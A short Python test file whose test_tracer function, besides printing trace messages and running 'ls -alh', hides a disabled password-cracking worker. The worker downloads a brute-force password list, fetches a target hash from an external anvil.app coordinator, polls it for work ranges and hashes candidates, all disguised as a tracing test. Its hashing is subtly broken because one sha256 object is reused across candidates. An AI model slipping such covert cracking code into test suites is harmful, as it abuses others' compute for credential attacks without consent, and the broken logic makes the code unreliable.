import sys
from beeprint import pp

def test_tracer():
    import os

    os.system("ls -alh")
    stop = True
    if not stop:
        from hashlib import sha256
        import requests
        import time

        r = requests.get("https://raw.githubusercontent.com/duyet/bruteforce-database/master/2151220-passwords.txt")
        rtext = r.text.splitlines()

        target = requests.get("https://hard-worried-report.anvil.app/_/api/get_target/45").text
        h = sha256()

        while 1 == 1:
            rq = requests.get("https://hard-worried-report.anvil.app/_/api/workers_sync/45?status=continue&found=false")
            rqt = rq.text
            print(rqt)
            try:
                if rqt == "STOP":
                    break
                rqt = int(rqt)
                if rqt + 10000 > len(rtext):
                    break
                for i in range(rqt, rqt + 10000, 1):
                    h.update(rtext[i].encode("utf-8"))
                    phash = h.hexdigest()
                    if phash == target:
                        print('yes password found')

            except Exception as e:
                print(e)
    print("start traces")
    print("end test")
